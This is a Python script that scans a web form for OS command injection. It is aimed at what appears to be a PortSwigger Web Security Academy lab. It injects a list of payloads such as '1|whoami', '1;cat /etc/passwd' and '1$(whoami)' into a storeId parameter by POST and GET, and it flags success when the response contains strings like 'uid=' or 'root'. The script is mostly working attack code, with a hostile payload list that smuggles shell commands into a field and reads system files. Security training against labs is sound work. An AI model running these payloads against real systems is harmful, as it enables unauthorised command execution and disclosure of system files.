# OS_command_injection.py
import requests
from bs4 import BeautifulSoup

# Define the target URL and specific parameters known to be vulnerable
base_url = 'https://0aab002404f4134c83526ea100380015.web-security-academy.net/'

# Define a list of payloads for visible OS command injection
visible_payloads = [
    '1|whoami',
    '1|id',
    '1|uname -a',
    '1;whoami',
    '1;id',
    '1;uname -a',
    '1&&whoami',
    '1&&id',
    '1&&uname -a',
    '1`whoami`',
    '1$(whoami)',
    '1;cat /etc/passwd',
    '1|cat /etc/passwd',
    '1&&cat /etc/passwd',
    '1|ls',
    '1;ls',
    '1&&ls',
]

def find_form_action_and_params(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    for form in forms:
        action = form.get('action')
        inputs = form.find_all('input')
        params = {input_tag.get('name'): input_tag.get('value', '') for input_tag in inputs if input_tag.get('name')}
        if action and params:
            return action, params
    return None, None

def test_visible_injection(url, method, action, initial_params, payloads):
    full_url = url + action
    for payload in payloads:
        params = initial_params.copy()
        # Assuming we need to inject in storeId, if another parameter is needed, adjust accordingly
        params['storeId'] = payload
        if method == 'POST':
            response = requests.post(full_url, data=params)
        else:
            response = requests.get(full_url, params=params)
        if response.status_code == 200:
            response_text = response.text.lower()
            if any(keyword in response_text for keyword in ['root', 'uid=', 'linux', 'bin/', 'daemon', 'sys']):
                return True, f'Visible Injection Detected with payload: {payload}'
    return False, 'No OS command injection vulnerabilities detected.'

def scan(url):
    action, initial_params = find_form_action_and_params(url)
    
    if action is None or initial_params is None:
        # Manually set the endpoint and parameters if form detection fails
        action = 'product/stock'
        initial_params = {'productId': '1', 'storeId': ''}
    
    # Test both POST and GET methods
    found, description = test_visible_injection(url, 'POST', action, initial_params, visible_payloads)
    if not found:
        found, description = test_visible_injection(url, 'GET', action, initial_params, visible_payloads)
    return found, description
